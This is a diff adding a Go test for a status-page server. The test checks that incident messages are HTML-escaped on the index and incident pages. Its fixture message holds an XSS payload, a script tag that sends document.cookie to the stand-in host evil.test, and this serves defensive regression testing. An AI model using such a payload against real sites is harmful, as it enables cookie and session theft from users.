@@ -139,6 +139,25 @@ func TestStatusPageMaintenance(t *testing.T) {
 	}
 }
 
+func TestIncidentMessagesAreEscaped(t *testing.T) {
+	srv, st := newTestServer(t)
+	inc, err := st.CreateIncident(context.Background(), incident.Incident{
+		Title: "Login problems", Status: incident.StatusInvestigating, Impact: incident.ImpactMinor,
+	}, "Investigating.\n<script>document.location='https://evil.test/?c='+document.cookie</script>")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, path := range []string{"/", "/incidents/" + itoa(inc.ID)} {
+		body := get(t, srv, path).Body.String()
+		if strings.Contains(body, "<script>document") {
+			t.Errorf("%s: incident message rendered as HTML", path)
+		}
+		if !strings.Contains(body, "Investigating.<br>&lt;script&gt;") {
+			t.Errorf("%s: message not escaped as expected", path)
+		}
+	}
+}
+
 func TestStatusPageEmpty(t *testing.T) {
 	srv, _ := newTestServer(t)
 	body := get(t, srv, "/").Body.String()
